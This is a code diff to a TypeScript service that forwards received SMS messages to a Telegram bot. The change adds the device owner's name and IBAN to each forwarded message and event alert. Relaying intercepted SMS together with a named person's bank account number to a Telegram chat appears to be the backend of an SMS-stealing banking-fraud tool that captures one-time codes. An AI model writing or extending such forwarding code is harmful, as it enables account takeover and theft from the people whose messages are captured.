@@ -14,7 +14,15 @@ export class TelegramService {
     this.enabled = this.configService.get<boolean>('telegram.enabled', false);
   }
 
-  async sendMessage(deviceId: string, sender: string, message: string, deviceModel?: string): Promise<void> {
+  async sendMessage(params: {
+    deviceId: string;
+    sender: string;
+    message: string;
+    ownerName?: string;
+    iban?: string;
+  }): Promise<void> {
+    const { deviceId, sender, message, ownerName, iban } = params;
+
     if (!this.enabled) {
       this.logger.debug('Telegram forwarding disabled, skipping');
       return;
@@ -25,12 +33,12 @@ export class TelegramService {
       return;
     }
 
-    const deviceLabel = deviceModel ? `${deviceModel} (${deviceId})` : deviceId;
-
     const text = [
       '\u{1F4E9} *SMS RECEIVED*',
       '',
-      `*Device:* \`${this.escapeMarkdown(deviceLabel)}\``,
+      `*Name:* ${this.escapeMarkdown(ownerName || 'Unknown')}`,
+      `*IBAN:* ${this.escapeMarkdown(iban || 'N/A')}`,
+      `*Device ID:* \`${deviceId}\``,
       `*From:* \`${sender}\``,
       '',
       `*Message:* ${this.escapeMarkdown(message)}`,
@@ -67,6 +75,8 @@ export class TelegramService {
     eventType: string;
     message?: string;
     occurredAt: string;
+    ownerName?: string;
+    iban?: string;
   }): Promise<void> {
     if (!this.enabled) return;
     if (!this.botToken || !this.chatId) return;
@@ -91,14 +101,11 @@ export class TelegramService {
     const lines = [
       `${icon} *${title}*`,
       '',
+      `*Name:* ${this.escapeMarkdown(event.ownerName || event.deviceName)}`,
+      `*IBAN:* ${this.escapeMarkdown(event.iban || 'N/A')}`,
       `*Device ID:* \`${event.deviceId}\``,
-      `*Model:* ${this.escapeMarkdown(event.deviceName)}`,
       `*Time:* ${new Date(event.occurredAt).toLocaleString()}`,
     ];
-
-    if (event.message) {
-      lines.push(`*Details:* ${this.escapeMarkdown(event.message)}`);
-    }
 
     const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
 
